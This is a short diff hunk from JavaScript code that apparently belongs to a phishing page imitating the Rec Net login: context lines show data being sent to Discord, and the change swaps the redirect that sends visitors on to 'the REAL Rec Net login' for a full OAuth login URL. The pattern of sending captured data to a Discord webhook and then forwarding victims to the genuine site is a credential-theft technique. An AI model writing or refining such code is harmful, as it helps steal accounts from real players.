@@ -160,7 +160,7 @@
                         console.error('Failed to send data to Discord:', response.status);
                         // You can add code here to display an error message to the user
                     }
-                    window.location.href = 'https://rec.net/login'; // Redirect to the REAL Rec Net login
+                    window.location.href = 'https://auth.rec.net/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Drecnet%26scope%3Dopenid%2520rn%2520offline_access%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Frec.net%252Fapi%252Fauth%252Fcallback%252Frecnet%26state%3DUp05GehaCWG_RmSFAnov9Ef9SRjnQ-Kvvbv3XEjv8TY%26code_challenge%3DwJRRUGQLjXMEUo6cnjDiPIUgjh556R1icLGjd9ND1cs%26code_challenge_method%3DS256'; // Redirect to the REAL Rec Net login
                 })
                 .catch(error => {
                     console.error('Error sending data to Discord:', error);
